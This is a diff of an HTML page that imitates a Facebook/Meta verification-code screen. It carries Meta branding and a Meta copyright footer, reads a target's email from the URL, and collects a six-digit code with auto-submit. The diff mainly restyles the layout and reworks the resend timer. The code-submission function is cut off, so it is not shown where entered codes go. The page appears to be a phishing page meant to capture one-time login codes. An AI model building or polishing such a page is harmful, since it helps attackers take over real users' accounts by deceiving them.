@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
 
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Confirm Verification</title>
+<title>Confirm code</title>
 
 <style>
 
@@ -19,33 +18,34 @@ font-family:Segoe UI, Arial;
 
 body{
 background:#f0f2f5;
-height:100vh;
+min-height:100vh;
 display:flex;
+flex-direction:column;
 align-items:center;
 justify-content:center;
-flex-direction:column;
+padding:20px;
 }
 
 /* TITLE */
 
 .title{
-position:absolute;
-top:80px;
-font-size:42px;
+font-size:38px;
 font-weight:900;
 color:#1877f2;
+margin-bottom:25px;
+text-align:center;
 }
 
 /* CARD */
 
 .card{
 background:white;
-padding:40px;
-border-radius:10px;
-width:90%;
+padding:30px;
+border-radius:12px;
+width:100%;
 max-width:420px;
 text-align:center;
-box-shadow:0 10px 30px rgba(0,0,0,0.15);
+box-shadow:0 12px 35px rgba(0,0,0,0.15);
 }
 
 /* DESCRIPTION */
@@ -61,41 +61,38 @@ margin-top:10px;
 .code-input{
 display:flex;
 justify-content:space-between;
-margin-top:30px;
+gap:8px;
+margin-top:25px;
 }
 
 .code-input input{
-width:55px;
-height:60px;
+width:45px;
+height:55px;
 font-size:24px;
 text-align:center;
 border:1px solid #ddd;
-border-radius:6px;
+border-radius:8px;
 }
 
 .code-input input:focus{
 outline:none;
 border-color:#1877f2;
-box-shadow:0 0 0 2px rgba(24,119,242,0.2);
+box-shadow:0 0 0 3px rgba(24,119,242,0.15);
 }
 
 /* BUTTON */
 
 .confirm-btn{
-margin-top:30px;
+margin-top:25px;
 width:100%;
-padding:14px;
+padding:15px;
 border:none;
-border-radius:6px;
+border-radius:8px;
 background:#1877f2;
 color:white;
 font-size:17px;
 font-weight:bold;
 cursor:pointer;
-}
-
-.confirm-btn:hover{
-background:#166fe5;
 }
 
 .confirm-btn.loading{
@@ -111,11 +108,22 @@ font-size:14px;
 color:#777;
 }
 
+.resend-btn{
+margin-top:10px;
+padding:10px 18px;
+border:none;
+border-radius:6px;
+background:#1877f2;
+color:white;
+font-weight:bold;
+cursor:pointer;
+display:none;
+}
+
 /* FOOTER */
 
 .site-footer{
-position:absolute;
-bottom:40px;
+margin-top:40px;
 text-align:center;
 font-size:13px;
 color:#737373;
@@ -127,15 +135,14 @@ margin:0 8px;
 cursor:pointer;
 }
 
-/* COPYRIGHT */
+.languages{
+margin-bottom:8px;
+}
 
 .footer-bottom{
-position:absolute;
-bottom:10px;
+margin-top:10px;
 font-size:12px;
 color:#8a8d91;
-text-align:center;
-width:100%;
 }
 
 </style>
@@ -144,11 +151,11 @@ width:100%;
 
 <body>
 
-<h1 class="title">Facebook Verification</h1>
+<h1 class="title">Confirm Code</h1>
 
 <div class="card">
 
-<h2>Enter Verification Code</h2>
+<h2>Check your email for a code</h2>
 
 <p class="description" id="message">
 Please enter the verification code sent to your email.
@@ -166,12 +173,12 @@ Please enter the verification code sent to your email.
 <button class="confirm-btn" id="confirmBtn" onclick="confirmCode()">Confirm Code</button>
 
 <div class="resend">
-Didn't receive the code? You can request another in <span id="timer">120</span>s
+Didn't get the code? <span id="timer">120</span>s
 </div>
 
-</div>
+<button class="resend-btn" id="resendBtn" onclick="resendCode()">Resend Code</button>
 
-<!-- LANGUAGES + LINKS -->
+</div>
 
 <div class="site-footer">
 
@@ -193,17 +200,13 @@ Didn't receive the code? You can request another in <span id="timer">120</span>s
 <span>Careers</span>
 </div>
 
-</div>
-
-<!-- COPYRIGHT -->
-
 <div class="footer-bottom">
 © 2026 Meta · Privacy · Terms · Help
 </div>
 
-<script>
+</div>
 
-/* GET EMAIL FROM URL */
+<script>
 
 const params = new URLSearchParams(window.location.search)
 const email = params.get("email")
@@ -213,11 +216,7 @@ document.getElementById("message").innerText =
 "Please enter the 6-digit verification code sent to " + email
 }
 
-/* INPUTS */
-
 const inputs = document.querySelectorAll(".code-input input")
-
-/* AUTO MOVE + AUTO SUBMIT */
 
 inputs.forEach((input,index)=>{
 
@@ -232,8 +231,6 @@ checkCodeComplete()
 })
 
 })
-
-/* PASTE DETECTION */
 
 inputs.forEach(input=>{
 
@@ -257,8 +254,6 @@ checkCodeComplete()
 
 })
 
-/* CHECK IF CODE COMPLETE */
-
 function checkCodeComplete(){
 
 let code=""
@@ -273,32 +268,20 @@ confirmCode()
 
 }
 
-/* TIMER */
-
 let seconds = 120
-let timerInterval
-
 const timer = document.getElementById("timer")
+const resendBtn = document.getElementById("resendBtn")
 
-function startTimer(){
-
-timerInterval = setInterval(()=>{
+const interval = setInterval(()=>{
 
 seconds--
 
 if(seconds <= 0){
 
-clearInterval(timerInterval)
+clearInterval(interval)
 
-timer.innerHTML = `<button onclick="resendCode()" style="
-background:#1877f2;
-color:white;
-border:none;
-padding:8px 14px;
-border-radius:5px;
-cursor:pointer;
-font-weight:bold;
-">Resend Code</button>`
+timer.innerText = "0"
+resendBtn.style.display="inline-block"
 
 return
 }
@@ -307,25 +290,12 @@ timer.innerText = seconds
 
 },1000)
 
-}
-
-startTimer()
-
-/* RESEND CODE */
-
 function resendCode(){
 
 seconds = 120
-
-timer.innerText = seconds
-
-startTimer()
-
-alert("A new verification code has been sent")
+location.reload()
 
 }
-
-/* CONFIRM CODE */
 
 async function confirmCode(){
 
